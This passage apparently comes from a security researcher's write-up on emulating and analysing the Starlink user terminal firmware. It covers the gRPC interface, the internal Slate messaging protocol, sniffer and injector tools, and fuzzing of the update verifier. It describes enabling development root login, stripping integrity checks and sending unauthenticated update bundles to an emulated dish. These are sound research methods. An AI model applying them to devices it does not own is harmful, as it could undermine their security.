<span>model</span> <span>=</span> <span>"spacex_satellite_user_terminal"</span><span>;</span>
<span>compatible</span> <span>=</span> <span>"st,gllcff"</span><span>;</span>

chosen <span>{</span>
    <span>linux_boot_slot</span> <span>=</span> <span>"0"</span><span>;</span>
    <span>ethprime</span> <span>=</span> <span>"eth_user"</span><span>;</span>
    <span>board_revision</span> <span>=</span> <span>"rev2_proto3"</span><span>;</span>
    <span>bootfip_slot</span> <span>=</span> &lt;0x00&gt;<span>;</span>
    <span>boot_slot</span> <span>=</span> &lt;0x0006&gt;<span>;</span>
    <span>boot_count</span> <span>=</span> &lt;0x0010&gt;<span>;</span>
    <span># ...</span>
<span>}</span><span>;</span>

security <span>{</span>
    dm-verity-pubkey <span>=</span> &lt;REDACTED&gt;<span>;</span>
    <span># ...</span>
<span>}</span><span>;</span>
<span># ...</span>
</code></pre></div>

<p>As the root filesystem, we used the one we extracted from the dish, with some modifications.</p>
<ul>
<li>Since we want to have access to the emulated dish, it must think it is a development version so that password access is enabled, thus we patched the <code>is_production_hardware</code> script. This could have been done in multiple ways, such as directly editing the <code>/etc/shadow</code> file, or adding our public key to the SSH's <code>authorized_users</code> files, but what we did is more effective because emulating development hardware will also enable other debugging features.</li>
<li>We also included the extracted runtime where it would have been mounted and removed the integrity verification and mounting step from the <code>/etc/runtime_init</code> file to be able to also tamper with the contents of that partition.</li>
<li>In the <code>/etc/runtime_init</code> file we also added some custom steps, for example, one that sets up our emulated network, and one that mounts read-write partitions as emulated volumes.</li>
</ul>
<p>Additional patches will be needed for other programs to start in the emulated environment.
We have also included some additional software that will be used for testing purposes such as <code>gdbserver</code>. But for these programs to be able to run, we either had to cross-compile them using the same build toolchain, or cross-compile them statically.</p>
<p>Even though both the root filesystem and the runtime are already placed in memory when the Linux kernel boots, a lot of processes directly access some partitions of the eMMC.
So we've also instructed QEMU to create a raw virtual block device, containing the original image dumped from the physical board.
However, since it is not seen by the kernel as an eMMC chip, the assigned name is different from the one assigned by the physical device.
Because of this, we had to change every reference to <code>mmcblk0</code> to <code>vda</code>, which is the name assigned by the kernel in the emulator.
Fortunately, as we saw in the previous section, the device only uses the name of the device in a script that creates some symbolic links to every partition, so we just had to patch that script and the command line argument for the kernel.
Partitions that are mounted with write permission, are instead mapped to a folder on the host so that it is possible to inspect their content afterward.</p>
<p>As for the network, it is not necessary to replicate the exact network configuration of the dish (as it is not very clear to us), we just need to have the right interface names and internet access.
This was done by using a tap interface, bridged to the host which acts as a NAT gateway, as shown in the following scripts.</p>
<p>Host:</p>
<div><pre><span></span><code><span>#!/bin/bash</span>

ifconfig <span>$1</span> <span>0</span>.0.0.0 promisc up
brctl addbr virbr0
brctl addif virbr0 <span>$1</span>

ip link <span>set</span> dev virbr0 up
ip link <span>set</span> dev <span>$1</span> up

ip addr add <span>192</span>.168.100.2/24 dev virbr0
<span>echo</span> <span>1</span> &gt; /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE
</code></pre></div>

<p>Guest:</p>
<div><pre><span></span><code><span>#!/bin/sh</span>

ip link <span>set</span> dev eth0 name eth_user
ip link <span>set</span> dev eth_user up
ip addr add <span>192</span>.168.100.1/24 dev eth_user

route add -net <span>0</span>.0.0.0 netmask <span>0</span>.0.0.0 gw <span>192</span>.168.100.2 dev eth_user
</code></pre></div>

<h3>Emulation Results</h3>
<p>As explained in previous sections, most of the hardware is not present in the emulated environment, so every component that tries to use it will fail.
Lower-level processes, such as <code>phyfw</code> and <code>[rx/tx]_lmac</code>, whose main task is to interact with Starlink's hardware won't work in this environment.
But also other binaries require some hardware to be present, the most common one is the secure element, which is used in most of the cryptographic exchanges.
So for those binaries to work we patched every instruction that would make the program crash, but if the hardware is required for substantial parts of the process, this solution is pointless.
In the end, we managed to emulate, among the main processes discussed in the Daemons subsection, only <code>user_terminal_frontend</code>, <code>starlink_software_update</code>, <code>umac</code> and the ones related to telemetry, along with smaller processes.
Further work on this topic could incrementally add support for some peripherals of the board, hence being able to emulate more and more processes.
Here you can see the console output of the final phase of the boot process in the emulated environment.</p>
<div><pre><span></span><code><span># [...]</span><span></span>
<span># kernel messages and (a lot of) errors from applications</span><span></span>
<span># trying to access missing hardware peripherals</span><span></span>
<span># [...]</span><span></span>

<span>setup_console</span><span>:</span><span> </span><span>Development</span><span> </span><span>login</span><span> </span><span>enabled</span><span>:</span><span> </span><span>yes</span><span></span>

<span>SpaceX</span><span> </span><span>User</span><span> </span><span>Terminal</span><span>.</span><span></span>
<span>user1</span><span> </span><span>login</span><span>:</span><span> </span><span>root</span><span></span>
<span>Password</span><span>:</span><span> </span>

<span>                                                                </span><span>*</span><span></span>
<span>                                                 </span><span>+</span><span>               </span>
<span>                                       </span><span>+</span><span>    </span><span>+</span><span>                    </span>
<span>                                </span><span>+</span><span>     </span><span>+</span><span>                          </span>
<span>                           </span><span>+</span><span>      </span><span>+</span><span>                              </span>
<span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span>              </span><span>+</span><span>     </span><span>+</span><span>                                   </span>
<span>  </span><span>+</span><span>        </span><span>+</span><span>       </span><span>+</span><span>     </span><span>+</span><span>                                       </span>
<span>     </span><span>+</span><span>       </span><span>+</span><span> </span><span>+</span><span>      </span><span>+</span><span>                                          </span>
<span>        </span><span>+</span><span>   </span><span>+</span><span>      </span><span>+</span><span>                                             </span>
<span>          </span><span>+</span><span>      </span><span>+</span><span> </span><span>+</span><span>                                             </span>
<span>      </span><span>+</span><span>      </span><span>+</span><span>        </span><span>+</span><span>                                          </span>
<span>   </span><span>+</span><span>       </span><span>+</span><span>    </span><span>+</span><span>        </span><span>+</span><span>                                       </span>
<span> </span><span>+</span><span>       </span><span>+</span><span>         </span><span>+</span><span>        </span><span>+</span><span>                                    </span>
<span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span>             </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span> </span><span>+</span><span>                                </span>


<span>The</span><span> </span><span>Flight</span><span> </span><span>Software</span><span> </span><span>does</span><span> </span><span>not</span><span> </span><span>log</span><span> </span><span>to</span><span> </span><span>the</span><span> </span><span>console</span><span>.</span><span> </span><span>If</span><span> </span><span>you</span><span> </span><span>wish</span><span> </span><span>to</span><span> </span><span>view</span><span></span>
<span>the</span><span> </span><span>output</span><span> </span><span>of</span><span> </span><span>the</span><span> </span><span>binaries</span><span>,</span><span> </span><span>you</span><span> </span><span>can</span><span> </span><span>use</span><span>:</span><span></span>

<span>tail</span><span> </span><span>-</span><span>f</span><span> </span><span>/</span><span>var</span><span>/</span><span>log</span><span>/</span><span>messages</span><span></span>

<span>Or</span><span> </span><span>view</span><span> </span><span>the</span><span> </span><span>viceroy</span><span> </span><span>telemetry</span><span> </span><span>stream</span><span>.</span><span></span>

<span>[</span><span>root</span><span>@</span><span>user1</span><span> </span><span>~</span><span>]</span><span>#</span><span></span>
</code></pre></div>

<p>All the scripts and files presented above are available <a href="https://github.com/quarkslab/starlink-tools/tree/main/emulator">here</a>, but we won't publish the whole UT's firmware, so you'll still have to extract it yourself to run the emulator.</p>
<h2><a name="communications"></a>Communications</h2>
<p>In IoT devices, communication with other devices is often a crucial function, if not the main one.
This is also the case for our device, which is basically an internet gateway and, as you can imagine, in this case, communication between the device and the satellites is the main function of the User Terminal.
We briefly analyzed the physical layer of this communication, but we didn't focus on it.
On a higher layer, the communication with satellites is split into two "planes":</p>
<ul>
<li>The Data Plane, which contains user traffic to and from the Internet.</li>
<li>The Control Plane, which contains every other kind of traffic, such as control messages between the antenna and the satellite (e.g. Connection handshake).</li>
</ul>
<p>But these are not the only communications happening in the device, in the following sections we will also see how the device interacts with user front-end applications and also how the different components inside the device communicate with each other.</p>
<h3>Front-end applications</h3>
<p>The communication with front-end applications is handled by the process <code>user_terminal_frontend</code>, which we were able to both run in the emulated environment and reverse-engineer, thanks to the language it has been implemented in (Go).
From the front-end applications, the user can see some statistics of the device and can change some high-level settings such as Wi-Fi credentials, reboot or stow the dish, etc.
These interactions use gRPC (Google's Remote Procedure Calls), which in turn uses <code>protobuf</code> underneath.
Protobuf definitions can be gathered either by extracting them from the binary (using <code>pbtk</code>) or by asking the reflection server of the process itself (using <code>grpcurl</code>, for example).
<a href="https://github.com/sparky8512/starlink-grpc-tools">Some</a> <a href="https://github.com/starlink-community/starlink-cli">tools</a> have been implemented as alternative front-end applications that use this protocol.
The aforementioned applications, implemented in Python, use the gRPC APIs exposed by the frontend binary, providing the user with an alternative user interface to inspect the statistics of the dish.
The authors of these applications probably gathered the protocol definitions from the mobile application or by using the reflection server.</p>
<p>In the following code snippet, you can see the (partial) definition of the <code>Request</code> message, which contains a few ids and one specific request, among the ones listed.
Every inner request has its definition, with the parameters the server needs to process the request, and a corresponding response that will hold the result.</p>
<div><pre><span></span><code><span>message</span><span> </span><span>Request</span><span> </span><span>{</span>
<span>    </span><span>uint64</span><span> </span><span>id</span><span> </span><span>=</span><span> </span><span>1</span><span>;</span>
<span>    </span><span>uint64</span><span> </span><span>epoch_id</span><span> </span><span>=</span><span> </span><span>14</span><span>;</span>
<span>    </span><span>string</span><span> </span><span>target_id</span><span> </span><span>=</span><span> </span><span>13</span><span>;</span>

<span>    </span><span>oneof</span><span> </span><span>request</span><span> </span><span>{</span>
<span>        </span><span>GetNextIdRequest</span><span> </span><span>get_next_id</span><span> </span><span>=</span><span> </span><span>1006</span><span>;</span>
<span>        </span><span>AuthenticateRequest</span><span> </span><span>authenticate</span><span> </span><span>=</span><span> </span><span>1005</span><span>;</span>
<span>        </span><span>EnableDebugTelemRequest</span><span> </span><span>enable_debug_telem</span><span> </span><span>=</span><span> </span><span>1034</span><span>;</span>
<span>        </span><span>FactoryResetRequest</span><span> </span><span>factory_reset</span><span> </span><span>=</span><span> </span><span>1011</span><span>;</span>
<span>        </span><span>GetDeviceInfoRequest</span><span> </span><span>get_device_info</span><span> </span><span>=</span><span> </span><span>1008</span><span>;</span>
<span>        </span><span>GetHistoryRequest</span><span> </span><span>get_history</span><span> </span><span>=</span><span> </span><span>1007</span><span>;</span>
<span>        </span><span>GetLogRequest</span><span> </span><span>get_log</span><span> </span><span>=</span><span> </span><span>1012</span><span>;</span>
<span>        </span><span>GetNetworkInterfacesRequest</span><span> </span><span>get_network_interfaces</span><span> </span><span>=</span><span> </span><span>1015</span><span>;</span>
<span>        </span><span>GetPingRequest</span><span> </span><span>get_ping</span><span> </span><span>=</span><span> </span><span>1009</span><span>;</span>
<span>        </span><span>PingHostRequest</span><span> </span><span>ping_host</span><span> </span><span>=</span><span> </span><span>1016</span><span>;</span>
<span>        </span><span>GetStatusRequest</span><span> </span><span>get_status</span><span> </span><span>=</span><span> </span><span>1004</span><span>;</span>
<span>        </span><span>RebootRequest</span><span> </span><span>reboot</span><span> </span><span>=</span><span> </span><span>1001</span><span>;</span>
<span>        </span><span>SetSkuRequest</span><span> </span><span>set_sku</span><span> </span><span>=</span><span> </span><span>1013</span><span>;</span>
<span>        </span><span>SetTrustedKeysRequest</span><span> </span><span>set_trusted_keys</span><span> </span><span>=</span><span> </span><span>1010</span><span>;</span>
<span>        </span><span>SpeedTestRequest</span><span> </span><span>speed_test</span><span> </span><span>=</span><span> </span><span>1003</span><span>;</span>
<span>        </span><span>SoftwareUpdateRequest</span><span> </span><span>software_update</span><span> </span><span>=</span><span> </span><span>1033</span><span>;</span>
<span>        </span><span>DishStowRequest</span><span> </span><span>dish_stow</span><span> </span><span>=</span><span> </span><span>2002</span><span>;</span>
<span>        </span><span>StartDishSelfTestRequest</span><span> </span><span>start_dish_self_test</span><span> </span><span>=</span><span> </span><span>2012</span><span>;</span>
<span>        </span><span>DishGetContextRequest</span><span> </span><span>dish_get_context</span><span> </span><span>=</span><span> </span><span>2003</span><span>;</span>
<span>        </span><span>DishGetObstructionMapRequest</span><span> </span><span>dish_get_obstruction_map</span><span> </span><span>=</span><span> </span><span>2008</span><span>;</span>
<span>        </span><span>DishSetEmcRequest</span><span> </span><span>dish_set_emc</span><span> </span><span>=</span><span> </span><span>2007</span><span>;</span>
<span>        </span><span>DishGetEmcRequest</span><span> </span><span>dish_get_emc</span><span> </span><span>=</span><span> </span><span>2009</span><span>;</span>
<span>        </span><span>DishSetConfigRequest</span><span> </span><span>dish_set_config</span><span> </span><span>=</span><span> </span><span>2010</span><span>;</span>
<span>        </span><span>DishGetConfigRequest</span><span> </span><span>dish_get_config</span><span> </span><span>=</span><span> </span><span>2011</span><span>;</span>
<span>        </span><span>// [...]</span>
<span>    </span><span>}</span>
<span>}</span>
</code></pre></div>

<p>There are two ways to communicate with this gRPC, either by using an insecure channel or by using a secure channel, which involves TLS and mutual authentication using certificates stored in the secure element.
The mobile application and the web interface both use the insecure channel, so the encrypted one must be used by something else.</p>
<p>Among the requests that can be made to the server, many of them are meant for front-end applications, a few examples are:</p>
<ul>
<li><code>FactoryResetRequest</code>, which requests a factory reset of the dish.</li>
<li><code>GetDeviceInfoRequest</code>, which returns some information about the device.</li>
<li><code>GetStatusRequest</code>, which requests the status of the dish.</li>
<li><code>RebootRequest</code>, which asks the dish to reboot.</li>
</ul>
<p>But some requests do not look like they are used by those applications, such as:</p>
<ul>
<li><code>SetTrustedKeysRequest</code>, which supposedly sets the provided public keys for future use by the process or by the SSH agent.</li>
</ul>
<div><pre><span></span><code><span>message</span><span> </span><span>SetTrustedKeysRequest</span><span> </span><span>{</span>
<span>    </span><span>repeated</span><span> </span><span>PublicKey</span><span> </span><span>keys</span><span> </span><span>=</span><span> </span><span>1</span><span>;</span>
<span>}</span>
</code></pre></div>

<ul>
<li><code>GetHeapDumpRequest</code>, which supposedly returns a dump of the Heap section of the process.</li>
<li><code>SoftwareUpdateRequest</code>, which supposedly initiates a software update with the provided update bundle.</li>
</ul>
<p>Unfortunately, most of these requests are not implemented in the binary we were analyzing (e.g. <code>SetTrustedKeysRequest</code>, <code>GetHeapDumpRequest</code>), and some of them require authentication (e.g. <code>DishGetContextRequest</code>, <code>DishGetEmcRequest</code>) both on the transport layer (secure gRPC channel) and application layer (by using the <code>AuthenticateRequest</code>).
We are not entirely sure who is supposed to use these requests and why most of them are not implemented in the binary, they could be used by another Stalink product such as the Wi-Fi router, or by Starlink support in the case of a partially bricked device, for remote assistance.
The most interesting request that is both implemented and does not require authentication is the <code>SoftwareUpdateRequest</code>, which will be explained better in Section <a href="#fuzzing">Fuzzing</a>.</p>
<p>Further work on this topic would be to analyze further every request handler for bugs or, better to fuzz them since there exist effective mutators for the protobuf protocol, such as <code>libprotobuf-mutator</code>.</p>
<h3>Inter-Process Communication</h3>
<p>Every process running in the runtime continuously shares information with other processes, to collaborate and share statistics.
As you can see from the figure showing the runtime architecture, every process only communicates with the User Terminal Control, which acts as an orchestrator for the whole runtime.
The protocol they are using is designed by SpaceX and it's called <code>Slate Sharing</code>.</p>
<p>It uses UDP for transport, and every process starts listening on a different port, on the loopback interface and will receive messages from the control process on that port.
On the other hand, the control process starts listening on multiple ports, one for every process that needs to communicate with it, so that the communication is bidirectional and without conflicts between processes.
Port numbers are configured through a configuration file that can be found at <code>/sx/local/runtime/common/service_directory</code>, in the following snippet, you can see a part of it, which lists the port numbers for communications between software update and control, and between frontend and control.</p>
<div><pre><span></span><code><span>################################################################################</span>
<span># Software update</span>
software_update_to_control                localhost   <span>27012</span>       udp_proto
control_to_software_update                localhost   <span>27013</span>       udp_proto

<span>################################################################################</span>
<span># Frontend</span>
control_to_frontend                       localhost   <span>6500</span>        udp_proto
frontend_to_control                       localhost   <span>6501</span>        udp_proto
</code></pre></div>

<p>Every couple of processes exchange different kinds of data, and messages do not contain any information about the content nor the structure of the data they transport, unlike other protocols such as JSON or XML.
Thus, to understand the content of messages we had to reverse engineer one of the binaries that makes use of the protocol, and in our case, the best choice was once again the user terminal frontend, which is the one implemented in Go.</p>
<p>Data is exchanged in binary form, by sending raw packed (no padding) C structures, in big-endian.
Every message contains a header, holding some information about the message, and a body, containing the actual data to be shared.
In the following snippet, you can see the data structure representing the message header, from the GolangAnalyzer Ghidra plugin.
With the same technique, we also extracted the structure of the body of messages between the frontend process and control.</p>
<div><pre><span></span><code>**************************************************************
* Name: sx_slate.SlateHeader                                 *
* Struct:                                                    *
*   +   0x0    0x4 uint BwpType                              *
*   +   0x4    0x4 uint Crc                                  *
*   +   0x8    0x8 longlong Seq                              *
*   +  0x10    0x4 uint Frame                                *
**************************************************************    
</code></pre></div>

<p>The header contains:</p>
<ul>
<li><code>BwpType</code>, which is a fixed value, acts as a "magic number" for the protocol (<code>00 00 01 20</code>).</li>
<li><code>Crc</code>, whose name suggests it is a Cyclic Redundancy Check, so a sort of error-detecting code for the message body, but by reverse engineering and sniffing messages, this field seems to be fixed as well, but it is different for every couple of messages.</li>
<li><code>Seq</code>, which is a sequence number that is incremented every message, but the protocol does not include any acknowledgment mechanisms to resend lost messages.</li>
<li><code>Frame</code>, which is used in case of fragmentation, i.e. when the message is bigger than the MTU (Maximum Transmission Unit), which is usually set to 1500 bytes. In this case, the body of the message is split into multiple frames, each one having an identical header, apart from the <code>Frame</code> field, which is incremented each frame, starting from 0.</li>
</ul>
<p>The body of the message is encoded in the same way, as an example, in the following snippet, you can see part of the structure of messages sent by the frontend process to control.</p>
<div><pre><span></span><code>**************************************************************
* Name: slate.FrontendToControl                              *
* Struct:                                                    *
*   +   0x0    0x1 bool AppReboot                            *
*   +   0x1    0x1 bool TiltToStowed                         *
*   +   0x4    0x4 uint StartDishCableTestRequests           *
*   +   0x8    0x1 bool IfLoopbackTest                       *
*   +  0x10    0x8 longlong Now                              *
*   +  0x18    0x8 longlong StarlinkWifiLastConnected        *
[...]    
</code></pre></div>

<p>Thanks to this information we would already be able to implement a message decoder (which we did), but this would only work for the communication between the frontend process and control. To decode other communications we would need to manually reverse engineer every other binary to find out the structure of messages, perhaps without even finding field names, but as explained in previous sections, it was hard to get useful information from C++ binaries.
Here you can see how we parse the header of Slate messages in Python, using the <code>ctypes</code> package.</p>
<div><pre><span></span><code><span>class</span> <span>SlateHeader</span><span>(</span><span>BigEndianStructure</span><span>):</span>
    <span>_pack_</span> <span>=</span> <span>1</span>
    <span>_fields_</span> <span>=</span> <span>[</span>
        <span>(</span><span>'BwpType'</span><span>,</span> <span>c_uint32</span><span>),</span>
        <span>(</span><span>'Crc'</span><span>,</span> <span>c_uint32</span><span>),</span>
        <span>(</span><span>'Seq'</span><span>,</span> <span>c_longlong</span><span>),</span>
        <span>(</span><span>'Frame'</span><span>,</span> <span>c_uint32</span><span>)</span>
    <span>]</span>
</code></pre></div>

<p>Then, to understand how the protocol is handled in C++ binaries, we looked for some fields of the structures we knew (the ones of the frontend process) in the control process, which should have them in order to decode those incoming messages.
We couldn't find them in the binary, but we found something way better, in the folder <code>/sx/local/runtime/common</code> there is a set of configuration files, such as <code>frontend_to_control</code>, which contain the structure of every message exchanged by processes.
Here is a snippet containing part of the aforementioned configuration file.</p>
<div><pre><span></span><code># Slate share message from gRPC frontend process to main control process.
app_reboot                          bool
tilt_to_stowed                      bool
start_dish_cable_test_requests      uint32
if_loopback_test.enabled            bool
now                                 int64
starlink_wifi_last_connected        int64
# [...]
</code></pre></div>

<p>With this, it is much easier to implement a more generic decoder that parses these protocol definitions and decodes messages accordingly.
Such a tool has been developed and will be discussed in the next section.</p>
<h3>Slate sniffer &amp; injector</h3>
<p>Slate messages are sent very fast, thus it is hard to understand what is happening without a proper visualization tool.
That is why we've implemented the <a href="https://github.com/quarkslab/starlink-tools/tree/main/slate-sniffer">Slate sniffer</a>, a tool that sniffs UDP packets on the loopback interface and decodes them on the fly, highlighting differences between consecutive messages.
In the following figure, you can see the overall architecture of the new tool, which we'll describe in more detail.
This tool was implemented for the emulated environment but we designed it keeping in mind that it would need to work also on the real dish.
For this reason, most of the work is done in the Sniffer, which is not in the device, and all the communications between the sniffer and the dish happen through SSH.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer.png" width="80%">
    </a>
</center>
<p>The first component that is used when starting the sniffer, is the protocol definition parser, which will parse configuration files:</p>
<ul>
<li><code>service_directory</code> to know which "services" (i.e. message definitions) are available and on which UDP ports they will communicate.</li>
<li><code>[P1]_to_[P2]</code> for every available couple of processes <code>P1</code> and <code>P2</code>, to know the format of messages that will be exchanged.</li>
</ul>
<p>This component will create <code>SlateMessageParser</code> objects, that will later be used to decode messages.
The decoding is made using the <code>struct</code> python package.</p>
<p>After this, <a href="https://www.tcpdump.org/"><code>TCPdump</code></a> will be launched on the dish, through SSH, and will listen on the loopback interface, only capturing UDP packets that have as the destination port one of the ones found by the parser.
The output of <a href="https://www.tcpdump.org/"><code>TCPdump</code></a> is piped to <a href="https://scapy.net/"><code>Scapy</code></a> which will decode the packet, understand which service it comes from, by reading the destination port, and will then extract the UDP payload and pass it to the message decoder.
When a message is parsed correctly, it will be stored in the Storage component, which in this case is a simple in-memory database, only holding recent messages (configurable, based on available memory).
On top of all this, there is a Flask server, exposing some APIs, to know which services are available, to know the schema of a message and, of course, to fetch messages.
We also implemented a front end, as a simple web interface, which is shown in the following picture.
From the current front end, it is possible to see messages in real-time, spotting differences thanks to the highlighted changes, selecting which fields to show and filtering or ordering them.
The frontend module is easily replaceable thanks to the exposed APIs, thus more complex interfaces can be integrated into the sniffer, to inspect the acquired data in more ways.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer-screen.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer-screen.png" width="80%">
    </a>
</center>
<p>After having a way to see messages, we thought it would be interesting to be able to inject custom messages, by editing the ones we are receiving or by creating new ones from scratch.
For this reason, we implemented the Slate injector, which shares most of the codebase with the sniffer.
The architecture of this tool is shown below.
Messages, to be received by processes, need to come from the loopback interface, thus we cannot send them directly from the Injector (which is external to the device).
This is why the injector will start a <code>socat</code> server on the dish, which will listen for UDP messages on the "external" network interface, and will then forward them to the right UDP port, by changing the source address to localhost.
Some API endpoints have been implemented to be able to inject messages from the front end and the current interface lets you edit and send a message or create a new one.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-injector.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-injector.png" width="80%">
    </a>
</center>
<p>Being able to inspect messages between processes helped us a lot in understanding what each process does without being able to fully reverse-engineer them.
Additionally, having the protocol definition and an easy way to inject messages, a natural development of the project is to fuzz the protocol, which will be tackled in Section <a href="#fuzzing">fuzzing</a>.
The full code of the Slate sniffer, injector and fuzzer can be found <a href="https://github.com/quarkslab/starlink-tools/tree/main/slate-sniffer">here</a>, but again without the protocol definitions, which you'll have to extract from the dish.</p>
<h2><a name="fuzzing"></a>Fuzzing</h2>
<p>In the last part of my internship at Quarkslab, we identified which parts of the software had been analyzed enough to be suitable for fuzz testing.
To find a good fuzzable target, we had to take into account multiple aspects:</p>
<ul>
<li>The possible attack vector in the case a bug was found:<ul>
<li>Can the bug be triggered by an authenticated user?</li>
<li>Does the attacker need to be connected to the Wi-Fi network of the dish?</li>
<li>Can the bug be triggered directly from the Internet?</li>
<li>Does the attacker need to already have access to the dish? In this case, the bug could be used for lateral movement inside the dish or privilege escalation.</li>
</ul>
</li>
<li>What is the impact of a possible bug in the target?</li>
<li>How easily fuzzable is the target, and which kind of fuzzing is the most suitable for the target:<ul>
<li>How is the input provided?</li>
<li>Can the target program run isolated? If a program makes use of many hardware peripherals and/or interacts with other components of the runtime, it will be hard to fuzz it in an isolated environment.</li>
<li>How deeply have we analyzed the target to know its internal workings?</li>
</ul>
</li>
</ul>
<h3>sxverity</h3>
<p>As we saw in the communication section,  it is possible to trigger a software update by sending a <code>SoftwareUpdateRequest</code> to the frontend process from the internal network.
This is an interesting request because it is the only one that does not look like it is meant for the user and does not require authentication.
Furthermore, the input of this request is the update bundle, which can be very big, while inputs for other requests are often empty or very simple.
The update bundle has to be split in chunks before being sent to the dish, here is a python script that sends this message.</p>
<div><pre><span></span><code><span>CHUNK_SIZE</span> <span>=</span> <span>16384</span>

<span>def</span> <span>update</span><span>(</span><span>data</span><span>):</span>
    <span>channel</span> <span>=</span> <span>grpc</span><span>.</span><span>insecure_channel</span><span>(</span><span>'192.168.100.1:9200'</span><span>)</span>
    <span>stub</span> <span>=</span> <span>device_pb2_grpc</span><span>.</span><span>DeviceStub</span><span>(</span><span>channel</span><span>)</span>

    <span>stream_id</span> <span>=</span> <span>int</span><span>.</span><span>from_bytes</span><span>(</span><span>os</span><span>.</span><span>urandom</span><span>(</span><span>4</span><span>),</span> <span>byteorder</span><span>=</span><span>'little'</span><span>)</span>

    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> <span>len</span><span>(</span><span>data</span><span>),</span> <span>CHUNK_SIZE</span><span>):</span>
        <span>chunk</span> <span>=</span> <span>data</span><span>[</span><span>i</span><span>:</span><span>min</span><span>(</span><span>len</span><span>(</span><span>data</span><span>),</span> <span>i</span> <span>+</span> <span>CHUNK_SIZE</span><span>)]</span>
        <span>request</span> <span>=</span> <span>device_pb2</span><span>.</span><span>Request</span><span>(</span><span>id</span> <span>=</span> <span>1</span><span>,</span> <span>epoch_id</span> <span>=</span> <span>1</span><span>,</span> <span>target_id</span> <span>=</span> <span>"unknown"</span><span>,</span>
            <span>software_update</span> <span>=</span> <span>common_pb2</span><span>.</span><span>SoftwareUpdateRequest</span><span>(</span>
                <span>stream_id</span> <span>=</span> <span>stream_id</span><span>,</span>
                <span>data</span> <span>=</span> <span>chunk</span><span>,</span>
                <span>open</span> <span>=</span> <span>i</span> <span>==</span> <span>0</span><span>,</span>
                <span>close</span> <span>=</span> <span>i</span> <span>+</span> <span>CHUNK_SIZE</span> <span>&gt;=</span> <span>len</span><span>(</span><span>data</span><span>)</span>
            <span>)</span>
        <span>)</span>
</code></pre></div>

<p>Every message needs to have the same <code>stream_id</code>, which can be randomly generated, then the first message has the <code>open</code> flag, while the last one has the <code>close</code> flag and all the ones in between don't have any of them.
The receiver of the message is the frontend process, which will save the update bundle in a temporary folder, without reading the content of it, so without performing any kind of input sanitization, it will just check that the size of the bundle does not reach a hardcoded threshold.
After that, the frontend process will notify the control process that a sideload update is ready to be applied, through a Slate message, and the control process will do the same for the software update process.
Once the latter receives the message, the update is ready to be started, the figure below shows the overall flow of messages and actions the <code>SoftwareUpdateRequest</code> triggers.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/sideload.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/sideload.png" width="60%">
    </a>
</center>
<p>After the software update process is notified that a software update bundle is ready to be applied, the update procedure starts.
From this moment, there is no difference between this kind of software update and the standard one, which is downloading the update bundle from Starlink's backend.
The update bundle is a <code>sxverity</code> image, which will be verified by the program with the same name and the inner <code>rom1fs</code> filesystem will be mounted.
Once mounted, the software update process will look for partition images in the mount point.
Every partition image will also have a SHA512 hashsum for additional integrity verification.
Finally, each available partition image will be flashed on the corresponding <code>/dev/blk/other/*</code> eMMC logical partition.</p>
<p>The update bundle is not accessed directly by the software update process, so the first process actually reading the content of the provided input is <code>sxverity</code>. Thus any fuzz test can be performed directly on that binary, skipping all previous steps.
In the following figure, you can see how the verification process is performed by <code>sxverity</code>.
The fuzzable code is very limited because the signature verification is made by a library, which is out of scope, and anything happening after a successful signature verification is to be considered unreachable for us because if we can reach that state, it means we were able to craft an update package that would be flashed so we don't need to find other bugs there.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity.png" width="80%">
    </a>
</center>
<p>The only part of the input that will be parsed by the code under test is the header of the image, thus that will be the only part of the input that the fuzzer will mutate.
Since that part of the program can be executed completely in complete isolation, we've fuzzed it inside <a href="https://www.unicorn-engine.org/"><code>unicorn</code></a>, a lightweight CPU emulator that can be instructed from Python, by using its bindings.
The first step was being able to emulate the code we want to test and setting up the harness for our fuzzer, which includes:</p>
<ul>
<li>Loading the binary.</li>
<li>Identifying a good starting point in the code, in which it is easy to set up the whole environment, such as placing the input in the right memory location and setting up every other memory structure that will be used by the code under testing.
  As an example, the following snippet shows how the input is placed in memory and how registers holding the addresses to the input locations are set.</li>
</ul>
<div><pre><span></span><code><span>def</span> <span>place_input_cb</span><span>(</span><span>mu</span><span>:</span> <span>Uc</span><span>,</span> <span>content</span><span>:</span> <span>bytes</span><span>,</span> <span>persistent_round</span><span>,</span> <span>data</span><span>):</span>
    <span>content_size</span> <span>=</span> <span>len</span><span>(</span><span>content</span><span>)</span>

    <span>if</span> <span>content_size</span> <span>&lt;</span> <span>INPUT_MIN_LEN</span><span>:</span>
        <span>return</span> <span>False</span>

    <span>pubkey</span><span>,</span> <span>header</span> <span>=</span> <span>key_and_header_from_data</span><span>(</span><span>content</span><span>)</span>

    <span># write data in memory</span>
    <span>mu</span><span>.</span><span>mem_write</span><span>(</span><span>PUBKEY_ADDR</span><span>,</span> <span>pubkey</span><span>)</span>
    <span>mu</span><span>.</span><span>mem_write</span><span>(</span><span>HEADER_ADDR</span><span>,</span> <span>header</span><span>)</span>

    <span># prepare function arguments</span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X2</span><span>,</span> <span>PUBKEY_ADDR</span><span>)</span> <span># pubkey address</span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X3</span><span>,</span> <span>0x40</span><span>)</span> <span># nblocks</span>
